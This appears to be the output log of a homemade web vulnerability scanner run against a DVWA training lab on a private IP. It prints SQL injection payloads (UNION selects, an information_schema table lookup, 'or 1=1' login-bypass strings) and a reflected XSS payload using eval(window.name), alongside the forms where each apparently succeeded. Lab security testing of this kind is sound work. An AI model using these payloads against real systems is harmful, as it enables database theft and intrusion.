+
+--> Testing http://192.168.128.128/dvwa/security.php?test=%22><script>eval(window.name)</script>
+--> Testing form in http://192.168.128.128/dvwa/security.php?test=%22><script>eval(window.name)</script>
+
+
+--> Testing http://192.168.128.128/dvwa/security.php?test=%22><script>eval(window.name)</script>
+--> Testing form in http://192.168.128.128/dvwa/security.php?test=%22><script>eval(window.name)</script>
+
+
+--> Testing http://192.168.128.128/dvwa/security.php?test=%22><script>eval(window.name)</script>
+--> Testing form in http://192.168.128.128/dvwa/security.php?test=%22><script>eval(window.name)</script>
+
+
+--> Testing http://192.168.128.128/dvwa/security.php?test=%22><script>eval(window.name)</script>
+--> Testing form in http://192.168.128.128/dvwa/ids_log.php
+--> Testing form in http://192.168.128.128/dvwa/ids_log.php
+--> Testing form in http://192.168.128.128/dvwa/ids_log.php
+--> Testing form in http://192.168.128.128/dvwa/ids_log.php
+--> Testing form in http://192.168.128.128/dvwa/ids_log.php
+--> Testing form in http://192.168.128.128/dvwa/ids_log.php
+--> Testing form in http://192.168.128.128/dvwa/ids_log.php
+--> Testing form in http://192.168.128.128/dvwa/ids_log.php
+--> Testing form in http://192.168.128.128/dvwa/ids_log.php
+--> Testing form in http://192.168.128.128/dvwa/ids_log.php
+--> Testing form in http://192.168.128.128/dvwa/ids_log.php
+--> Testing form in http://192.168.128.128/dvwa/ids_log.php
+--> Testing form in http://192.168.128.128/dvwa/ids_log.php
+Some characters could not be decoded, and were replaced with REPLACEMENT CHARACTER.
+--> Testing form in http://192.168.128.128/dvwa/setup.php
+--> Testing form in http://192.168.128.128/dvwa/setup.php
+--> Testing form in http://192.168.128.128/dvwa/setup.php
+--> Testing form in http://192.168.128.128/dvwa/setup.php
+--> Testing form in http://192.168.128.128/dvwa/setup.php
+--> Testing form in http://192.168.128.128/dvwa/setup.php
+--> Testing form in http://192.168.128.128/dvwa/setup.php
+--> Testing form in http://192.168.128.128/dvwa/setup.php
+--> Testing form in http://192.168.128.128/dvwa/setup.php
+--> Testing form in http://192.168.128.128/dvwa/setup.php
+--> Testing form in http://192.168.128.128/dvwa/setup.php
+--> Testing form in http://192.168.128.128/dvwa/setup.php
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/brute/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/brute/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/brute/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/brute/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/brute/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/brute/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/brute/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/brute/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/brute/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/brute/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/brute/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/brute/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/exec/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/exec/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/exec/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/exec/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/exec/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/exec/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/exec/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/exec/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/exec/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/exec/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/exec/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/exec/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/csrf/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/csrf/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/csrf/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/csrf/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/csrf/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/csrf/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/csrf/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/csrf/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/csrf/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/csrf/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/csrf/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/csrf/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/sqli/
+
+
+***** SQL Injection vulnerability discovered in http://192.168.128.128/dvwa/vulnerabilities/sqli/ in the following form *****
+
+ Script used --> %' or 0=0 union select null, version() #
+<form action="#" method="GET">
+<input name="id" type="text"/>
+<input name="Submit" type="submit" value="Submit"/>
+</form>
+
+
+
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/sqli/
+
+
+***** SQL Injection vulnerability discovered in http://192.168.128.128/dvwa/vulnerabilities/sqli/ in the following form *****
+
+ Script used --> %' and 1=0 union select null, table_name from information_schema.tables where table_name like 'user%'#
+<form action="#" method="GET">
+<input name="id" type="text"/>
+<input name="Submit" type="submit" value="Submit"/>
+</form>
+
+
+
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/sqli/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/sqli/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/sqli/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/sqli/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/sqli/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/sqli/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/sqli/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/sqli/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/sqli/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/sqli/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/sqli_blind/
+
+
+***** SQL Injection vulnerability discovered in http://192.168.128.128/dvwa/vulnerabilities/sqli_blind/ in the following form *****
+
+ Script used --> %' or 0=0 union select null, version() #
+<form action="#" method="GET">
+<input name="id" type="text"/>
+<input name="Submit" type="submit" value="Submit"/>
+</form>
+
+
+
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/sqli_blind/
+
+
+***** SQL Injection vulnerability discovered in http://192.168.128.128/dvwa/vulnerabilities/sqli_blind/ in the following form *****
+
+ Script used --> %' and 1=0 union select null, table_name from information_schema.tables where table_name like 'user%'#
+<form action="#" method="GET">
+<input name="id" type="text"/>
+<input name="Submit" type="submit" value="Submit"/>
+</form>
+
+
+
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/sqli_blind/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/sqli_blind/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/sqli_blind/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/sqli_blind/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/sqli_blind/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/sqli_blind/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/sqli_blind/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/sqli_blind/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/sqli_blind/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/sqli_blind/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/upload/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/upload/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/upload/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/upload/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/upload/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/upload/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/upload/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/upload/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/upload/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/upload/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/upload/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/upload/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/xss_r/
+
+
+***** SQL Injection vulnerability discovered in http://192.168.128.128/dvwa/vulnerabilities/xss_r/ in the following form *****
+
+ Script used --> %' or 0=0 union select null, version() #
+<form action="#" method="GET" name="XSS">
+<p>What's your name?</p>
+<input name="name" type="text"/>
+<input type="submit" value="Submit"/>
+</form>
+
+
+
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/xss_r/
+
+
+***** SQL Injection vulnerability discovered in http://192.168.128.128/dvwa/vulnerabilities/xss_r/ in the following form *****
+
+ Script used --> %' and 1=0 union select null, table_name from information_schema.tables where table_name like 'user%'#
+<form action="#" method="GET" name="XSS">
+<p>What's your name?</p>
+<input name="name" type="text"/>
+<input type="submit" value="Submit"/>
+</form>
+
+
+
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/xss_r/
+
+
+***** SQL Injection vulnerability discovered in http://192.168.128.128/dvwa/vulnerabilities/xss_r/ in the following form *****
+
+ Script used --> admin" or 1=1#
+<form action="#" method="GET" name="XSS">
+<p>What's your name?</p>
+<input name="name" type="text"/>
+<input type="submit" value="Submit"/>
+</form>
+
+
+
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/xss_r/
+
+
+***** SQL Injection vulnerability discovered in http://192.168.128.128/dvwa/vulnerabilities/xss_r/ in the following form *****
+
+ Script used --> admin" or 1=1/*
+<form action="#" method="GET" name="XSS">
+<p>What's your name?</p>
+<input name="name" type="text"/>
+<input type="submit" value="Submit"/>
+</form>
+
+
+
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/xss_r/
+
+
+***** SQL Injection vulnerability discovered in http://192.168.128.128/dvwa/vulnerabilities/xss_r/ in the following form *****
+
+ Script used --> admin") or ("1"="1
+<form action="#" method="GET" name="XSS">
+<p>What's your name?</p>
+<input name="name" type="text"/>
+<input type="submit" value="Submit"/>
+</form>
+
+
+
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/xss_r/
+
+
+***** SQL Injection vulnerability discovered in http://192.168.128.128/dvwa/vulnerabilities/xss_r/ in the following form *****
+
+ Script used --> admin") or ("1"="1"--
+<form action="#" method="GET" name="XSS">
+<p>What's your name?</p>
+<input name="name" type="text"/>
+<input type="submit" value="Submit"/>
+</form>
+
+
+
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/xss_r/
+
+
+***** SQL Injection vulnerability discovered in http://192.168.128.128/dvwa/vulnerabilities/xss_r/ in the following form *****
+
+ Script used --> admin") or ("1"="1"#
+<form action="#" method="GET" name="XSS">
+<p>What's your name?</p>
+<input name="name" type="text"/>
+<input type="submit" value="Submit"/>
+</form>
+
+
+
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/xss_r/
+
+
+***** SQL Injection vulnerability discovered in http://192.168.128.128/dvwa/vulnerabilities/xss_r/ in the following form *****
+
+ Script used --> admin") or ("1"="1"/*
+<form action="#" method="GET" name="XSS">
+<p>What's your name?</p>
+<input name="name" type="text"/>
+<input type="submit" value="Submit"/>
+</form>
+
+
+
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/xss_r/
+
+
+***** SQL Injection vulnerability discovered in http://192.168.128.128/dvwa/vulnerabilities/xss_r/ in the following form *****
+
+ Script used --> admin") or "1"="1
+<form action="#" method="GET" name="XSS">
+<p>What's your name?</p>
+<input name="name" type="text"/>
+<input type="submit" value="Submit"/>
+</form>
+
+
+
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/xss_r/
+
+
+***** SQL Injection vulnerability discovered in http://192.168.128.128/dvwa/vulnerabilities/xss_r/ in the following form *****
+
+ Script used --> admin") or "1"="1"--
+<form action="#" method="GET" name="XSS">
+<p>What's your name?</p>
+<input name="name" type="text"/>
+<input type="submit" value="Submit"/>
+</form>
+
+
+
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/xss_r/
+
+
+***** SQL Injection vulnerability discovered in http://192.168.128.128/dvwa/vulnerabilities/xss_r/ in the following form *****
+
+ Script used --> admin") or "1"="1"#
+<form action="#" method="GET" name="XSS">
+<p>What's your name?</p>
+<input name="name" type="text"/>
+<input type="submit" value="Submit"/>
+</form>
+
+
+
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/xss_r/
+
+
+***** SQL Injection vulnerability discovered in http://192.168.128.128/dvwa/vulnerabilities/xss_r/ in the following form *****
+
+ Script used --> admin") or "1"="1"/*
+<form action="#" method="GET" name="XSS">
+<p>What's your name?</p>
+<input name="name" type="text"/>
+<input type="submit" value="Submit"/>
+</form>
+
+
+
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/xss_s/
+
+
+***** SQL Injection vulnerability discovered in http://192.168.128.128/dvwa/vulnerabilities/xss_s/ in the following form *****
+
+ Script used --> %' or 0=0 union select null, version() #
+<form method="post" name="guestform" onsubmit="return validate_form(this)">
+<table border="0" cellpadding="2" cellspacing="1" width="550">
+<tr>
+<td width="100">Name *</td> <td>
+<input maxlength="10" name="txtName" size="30" type="text"/></td>
+</tr>
+<tr>
+<td width="100">Message *</td> <td>
+<textarea cols="50" maxlength="50" name="mtxMessage" rows="3"></textarea></td>
+</tr>
+<tr>
+<td width="100"> </td>
+<td>
+<input name="btnSign" onclick="return checkForm();" type="submit" value="Sign Guestbook"/></td>
+</tr>
+</table>
+</form>
+
+
+
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/xss_s/
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/xss_s/
+
+
+***** SQL Injection vulnerability discovered in http://192.168.128.128/dvwa/vulnerabilities/xss_s/ in the following form *****
+
+ Script used --> admin" or 1=1#
+<form method="post" name="guestform" onsubmit="return validate_form(this)">
+<table border="0" cellpadding="2" cellspacing="1" width="550">
+<tr>
+<td width="100">Name *</td> <td>
+<input maxlength="10" name="txtName" size="30" type="text"/></td>
+</tr>
+<tr>
+<td width="100">Message *</td> <td>
+<textarea cols="50" maxlength="50" name="mtxMessage" rows="3"></textarea></td>
+</tr>
+<tr>
+<td width="100"> </td>
+<td>
+<input name="btnSign" onclick="return checkForm();" type="submit" value="Sign Guestbook"/></td>
+</tr>
+</table>
+</form>
+
+
+
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/xss_s/
+
+
+***** SQL Injection vulnerability discovered in http://192.168.128.128/dvwa/vulnerabilities/xss_s/ in the following form *****
+
+ Script used --> admin" or 1=1/*
+<form method="post" name="guestform" onsubmit="return validate_form(this)">
+<table border="0" cellpadding="2" cellspacing="1" width="550">
+<tr>
+<td width="100">Name *</td> <td>
+<input maxlength="10" name="txtName" size="30" type="text"/></td>
+</tr>
+<tr>
+<td width="100">Message *</td> <td>
+<textarea cols="50" maxlength="50" name="mtxMessage" rows="3"></textarea></td>
+</tr>
+<tr>
+<td width="100"> </td>
+<td>
+<input name="btnSign" onclick="return checkForm();" type="submit" value="Sign Guestbook"/></td>
+</tr>
+</table>
+</form>
+
+
+
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/xss_s/
+
+
+***** SQL Injection vulnerability discovered in http://192.168.128.128/dvwa/vulnerabilities/xss_s/ in the following form *****
+
+ Script used --> admin") or ("1"="1
+<form method="post" name="guestform" onsubmit="return validate_form(this)">
+<table border="0" cellpadding="2" cellspacing="1" width="550">
+<tr>
+<td width="100">Name *</td> <td>
+<input maxlength="10" name="txtName" size="30" type="text"/></td>
+</tr>
+<tr>
+<td width="100">Message *</td> <td>
+<textarea cols="50" maxlength="50" name="mtxMessage" rows="3"></textarea></td>
+</tr>
+<tr>
+<td width="100"> </td>
+<td>
+<input name="btnSign" onclick="return checkForm();" type="submit" value="Sign Guestbook"/></td>
+</tr>
+</table>
+</form>
+
+
+
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/xss_s/
+
+
+***** SQL Injection vulnerability discovered in http://192.168.128.128/dvwa/vulnerabilities/xss_s/ in the following form *****
+
+ Script used --> admin") or ("1"="1"--
+<form method="post" name="guestform" onsubmit="return validate_form(this)">
+<table border="0" cellpadding="2" cellspacing="1" width="550">
+<tr>
+<td width="100">Name *</td> <td>
+<input maxlength="10" name="txtName" size="30" type="text"/></td>
+</tr>
+<tr>
+<td width="100">Message *</td> <td>
+<textarea cols="50" maxlength="50" name="mtxMessage" rows="3"></textarea></td>
+</tr>
+<tr>
+<td width="100"> </td>
+<td>
+<input name="btnSign" onclick="return checkForm();" type="submit" value="Sign Guestbook"/></td>
+</tr>
+</table>
+</form>
+
+
+
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/xss_s/
+
+
+***** SQL Injection vulnerability discovered in http://192.168.128.128/dvwa/vulnerabilities/xss_s/ in the following form *****
+
+ Script used --> admin") or ("1"="1"#
+<form method="post" name="guestform" onsubmit="return validate_form(this)">
+<table border="0" cellpadding="2" cellspacing="1" width="550">
+<tr>
+<td width="100">Name *</td> <td>
+<input maxlength="10" name="txtName" size="30" type="text"/></td>
+</tr>
+<tr>
+<td width="100">Message *</td> <td>
+<textarea cols="50" maxlength="50" name="mtxMessage" rows="3"></textarea></td>
+</tr>
+<tr>
+<td width="100"> </td>
+<td>
+<input name="btnSign" onclick="return checkForm();" type="submit" value="Sign Guestbook"/></td>
+</tr>
+</table>
+</form>
+
+
+
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/xss_s/
+
+
+***** SQL Injection vulnerability discovered in http://192.168.128.128/dvwa/vulnerabilities/xss_s/ in the following form *****
+
+ Script used --> admin") or ("1"="1"/*
+<form method="post" name="guestform" onsubmit="return validate_form(this)">
+<table border="0" cellpadding="2" cellspacing="1" width="550">
+<tr>
+<td width="100">Name *</td> <td>
+<input maxlength="10" name="txtName" size="30" type="text"/></td>
+</tr>
+<tr>
+<td width="100">Message *</td> <td>
+<textarea cols="50" maxlength="50" name="mtxMessage" rows="3"></textarea></td>
+</tr>
+<tr>
+<td width="100"> </td>
+<td>
+<input name="btnSign" onclick="return checkForm();" type="submit" value="Sign Guestbook"/></td>
+</tr>
+</table>
+</form>
+
+
+
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/xss_s/
+
+
+***** SQL Injection vulnerability discovered in http://192.168.128.128/dvwa/vulnerabilities/xss_s/ in the following form *****
+
+ Script used --> admin") or "1"="1
+<form method="post" name="guestform" onsubmit="return validate_form(this)">
+<table border="0" cellpadding="2" cellspacing="1" width="550">
+<tr>
+<td width="100">Name *</td> <td>
+<input maxlength="10" name="txtName" size="30" type="text"/></td>
+</tr>
+<tr>
+<td width="100">Message *</td> <td>
+<textarea cols="50" maxlength="50" name="mtxMessage" rows="3"></textarea></td>
+</tr>
+<tr>
+<td width="100"> </td>
+<td>
+<input name="btnSign" onclick="return checkForm();" type="submit" value="Sign Guestbook"/></td>
+</tr>
+</table>
+</form>
+
+
+
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/xss_s/
+
+
+***** SQL Injection vulnerability discovered in http://192.168.128.128/dvwa/vulnerabilities/xss_s/ in the following form *****
+
+ Script used --> admin") or "1"="1"--
+<form method="post" name="guestform" onsubmit="return validate_form(this)">
+<table border="0" cellpadding="2" cellspacing="1" width="550">
+<tr>
+<td width="100">Name *</td> <td>
+<input maxlength="10" name="txtName" size="30" type="text"/></td>
+</tr>
+<tr>
+<td width="100">Message *</td> <td>
+<textarea cols="50" maxlength="50" name="mtxMessage" rows="3"></textarea></td>
+</tr>
+<tr>
+<td width="100"> </td>
+<td>
+<input name="btnSign" onclick="return checkForm();" type="submit" value="Sign Guestbook"/></td>
+</tr>
+</table>
+</form>
+
+
+
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/xss_s/
+
+
+***** SQL Injection vulnerability discovered in http://192.168.128.128/dvwa/vulnerabilities/xss_s/ in the following form *****
+
+ Script used --> admin") or "1"="1"#
+<form method="post" name="guestform" onsubmit="return validate_form(this)">
+<table border="0" cellpadding="2" cellspacing="1" width="550">
+<tr>
+<td width="100">Name *</td> <td>
+<input maxlength="10" name="txtName" size="30" type="text"/></td>
+</tr>
+<tr>
+<td width="100">Message *</td> <td>
+<textarea cols="50" maxlength="50" name="mtxMessage" rows="3"></textarea></td>
+</tr>
+<tr>
+<td width="100"> </td>
+<td>
+<input name="btnSign" onclick="return checkForm();" type="submit" value="Sign Guestbook"/></td>
+</tr>
+</table>
+</form>
+
+
+
+--> Testing form in http://192.168.128.128/dvwa/vulnerabilities/xss_s/
+
+
+***** SQL Injection vulnerability discovered in http://192.168.128.128/dvwa/vulnerabilities/xss_s/ in the following form *****
+
+ Script used --> admin") or "1"="1"/*
+<form method="post" name="guestform" onsubmit="return validate_form(this)">
+<table border="0" cellpadding="2" cellspacing="1" width="550">
+<tr>
+<td width="100">Name *</td> <td>
+<input maxlength="10" name="txtName" size="30" type="text"/></td>
+</tr>
+<tr>
+<td width="100">Message *</td> <td>
+<textarea cols="50" maxlength="50" name="mtxMessage" rows="3"></textarea></td>
+</tr>
+<tr>
+<td width="100"> </td>
+<td>
+<input name="btnSign" onclick="return checkForm();" type="submit" value="Sign Guestbook"/></td>
+</tr>
+</table>
+</form>
+
+
+
+--> Testing form in http://192.168.128.128/dvwa/security.php
+--> Testing form in http://192.168.128.128/dvwa/security.php
+--> Testing form in http://192.168.128.128/dvwa/security.php
+--> Testing form in http://192.168.128.128/dvwa/security.php
+--> Testing form in http://192.168.128.128/dvwa/security.php
+--> Testing form in http://192.168.128.128/dvwa/security.php
+--> Testing form in http://192.168.128.128/dvwa/security.php
+--> Testing form in http://192.168.128.128/dvwa/security.php
+--> Testing form in http://192.168.128.128/dvwa/security.php
+--> Testing form in http://192.168.128.128/dvwa/security.php
+--> Testing form in http://192.168.128.128/dvwa/security.php
+--> Testing form in http://192.168.128.128/dvwa/security.php
+--> Testing form in http://192.168.128.128/dvwa/security.php?phpids=on
+
+
+--> Testing http://192.168.128.128/dvwa/security.php?phpids=on
+--> Testing form in http://192.168.128.128/dvwa/security.php?phpids=on
+
+
+--> Testing http://192.168.128.128/dvwa/security.php?phpids=on
+--> Testing form in http://192.168.128.128/dvwa/security.php?phpids=on
+
+
+--> Testing http://192.168.128.128/dvwa/security.php?phpids=on
+--> Testing form in http://192.168.128.128/dvwa/security.php?phpids=on
+
+
+--> Testing http://192.168.128.128/dvwa/security.php?phpids=on
+--> Testing form in http://192.168.128.128/dvwa/security.php?phpids=on
+
+
+--> Testing http://192.168.128.128/dvwa/security.php?phpids=on
+--> Testing form in http://192.168.128.128/dvwa/security.php?phpids=on
+
+
+--> Testing http://192.168.128.128/dvwa/security.php?phpids=on
+--> Testing form in http://192.168.128.128/dvwa/security.php?phpids=on
+
+
+--> Testing http://192.168.128.128/dvwa/security.php?phpids=on
+--> Testing form in http://192.168.128.128/dvwa/security.php?phpids=on
+
+
+--> Testing http://192.168.128.128/dvwa/security.php?phpids=on
+--> Testing form in http://192.168.128.128/dvwa/security.php?phpids=on
+
+
+--> Testing http://192.168.128.128/dvwa/security.php?phpids=on
+--> Testing form in http://192.168.128.128/dvwa/security.php?phpids=on
+
+
+--> Testing http://192.168.128.128/dvwa/security.php?phpids=on
+--> Testing form in http://192.168.128.128/dvwa/security.php?phpids=on
+
+
+--> Testing http://192.168.128.128/dvwa/security.php?phpids=on
+--> Testing form in http://192.168.128.128/dvwa/security.php?phpids=on
+
+
+--> Testing http://192.168.128.128/dvwa/security.php?phpids=on
+--> Testing form in http://192.168.128.128/dvwa/security.php?phpids=off
+
+
+--> Testing http://192.168.128.128/dvwa/security.php?phpids=off
+--> Testing form in http://192.168.128.128/dvwa/security.php?phpids=off
+
+
+--> Testing http://192.168.128.128/dvwa/security.php?phpids=off
+--> Testing form in http://192.168.128.128/dvwa/security.php?phpids=off
+
+
+--> Testing http://192.168.128.128/dvwa/security.php?phpids=off
+--> Testing form in http://192.168.128.128/dvwa/security.php?phpids=off
+
+
+--> Testing http://192.168.128.128/dvwa/security.php?phpids=off
+--> Testing form in http://192.168.128.128/dvwa/security.php?phpids=off
+
+
+--> Testing http://192.168.128.128/dvwa/security.php?phpids=off
+--> Testing form in http://192.168.128.128/dvwa/security.php?phpids=off
+
+
+--> Testing http://192.168.128.128/dvwa/security.php?phpids=off
+--> Testing form in http://192.168.128.128/dvwa/security.php?phpids=off
+
+
+--> Testing http://192.168.128.128/dvwa/security.php?phpids=off
+--> Testing form in http://192.168.128.128/dvwa/security.php?phpids=off
+
+
+--> Testing http://192.168.128.128/dvwa/security.php?phpids=off
+--> Testing form in http://192.168.128.128/dvwa/security.php?phpids=off
+
+
+--> Testing http://192.168.128.128/dvwa/security.php?phpids=off
+--> Testing form in http://192.168.128.128/dvwa/security.php?phpids=off
+
+
+--> Testing http://192.168.128.128/dvwa/security.php?phpids=off
+--> Testing form in http://192.168.128.128/dvwa/security.php?phpids=off
+
+
+--> Testing http://192.168.128.128/dvwa/security.php?phpids=off
+--> Testing form in http://192.168.128.128/dvwa/security.php?phpids=off
+
+
+--> Testing http://192.168.128.128/dvwa/security.php?phpids=off
+--> Testing form in http://192.168.128.128/dvwa/security.php?test=%22><script>eval(window.name)</script>
+
+
+--> Testing http://192.168.128.128/dvwa/security.php?test=%22><script>eval(window.name)</script>
+--> Testing form in http://192.168.128.128/dvwa/security.php?test=%22><script>eval(window.name)</script>
+
+
+--> Testing http://192.168.128.128/dvwa/security.php?test=%22><script>eval(window.name)</script>
+--> Testing form in http://192.168.128.128/dvwa/security.php?test=%22><script>eval(window.name)</script>
+
+
+--> Testing http://192.168.128.128/dvwa/security.php?test=%22><script>eval(window.name)</script>
+--> Testing form in http://192.168.128.128/dvwa/security.php?test=%22><script>eval(window.name)</script>
+
+
+--> Testing http://192.168.128.128/dvwa/security.php?test=%22><script>eval(window.name)</script>
+--> Testing form in http://192.168.128.128/dvwa/security.php?test=%22><script>eval(window.name)</script>
+
+
+--> Testing http://192.168.128.128/dvwa/security.php?test=%22><script>eval(window.name)</script>
+--> Testing form in http://192.168.128.128/dvwa/security.php?test=%22><script>eval(window.name)</script>
+
+
+--> Testing http://192.168.128.128/dvwa/security.php?test=%22><script>eval(window.name)</script>
+--> Testing form in http://192.168.128.128/dvwa/security.php?test=%22><script>eval(window.name)</script>
+
+
+--> Testing http://192.168.128.128/dvwa/security.php?test=%22><script>eval(window.name)</script>
+--> Testing form in http://192.168.128.128/dvwa/security.php?test=%22><script>eval(window.name)</script>
+
+
+--> Testing http://192.168.128.128/dvwa/security.php?test=%22><script>eval(window.name)</script>
+--> Testing form in http://192.168.128.128/dvwa/security.php?test=%22><script>eval(window.name)</script>
+
+
+--> Testing http://192.168.128.128/dvwa/security.php?test=%22><script>eval(window.name)</script>
+--> Testing form in http://192.168.128.128/dvwa/security.php?test=%22><script>eval(window.name)</script>
+
+
+--> Testing http://192.168.128.128/dvwa/security.php?test=%22><script>eval(window.name)</script>
+--> Testing form in http://192.168.128.128/dvwa/security.php?test=%22><script>eval(window.name)</script>
+
+
+--> Testing http://192.168.128.128/dvwa/security.php?test=%22><script>eval(window.name)</script>
+--> Testing form in http://192.168.128.128/dvwa/security.php?test=%22><script>eval(window.name)</script>
+
+
+--> Testing http://192.168.128.128/dvwa/security.php?test=%22><script>eval(window.name)</script>
+--> Testing form in http://192.168.128.128/dvwa/ids_log.php
+--> Testing form in http://192.168.128.128/dvwa/ids_log.php
+--> Testing form in http://192.168.128.128/dvwa/ids_log.php
+--> Testing form in http://192.168.128.128/dvwa/ids_log.php
+--> Testing form in http://192.168.128.128/dvwa/ids_log.php
+--> Testing form in http://192.168.128.128/dvwa/ids_log.php
+--> Testing form in http://192.168.128.128/dvwa/ids_log.php
+--> Testing form in http://192.168.128.128/dvwa/ids_log.php
+--> Testing form in http://192.168.128.128/dvwa/ids_log.php
+--> Testing form in http://192.168.128.128/dvwa/ids_log.php
+--> Testing form in http://192.168.128.128/dvwa/ids_log.php
+--> Testing form in http://192.168.128.128/dvwa/ids_log.php
+
+Total number of URLs scanned for XSS
+count =  14
+XSS Vulnerabilities found in
+count =  2
+Total number of URLs scanned for SQLi
+count =  14
+SQLi Vulnerabilities found in
+count =  4
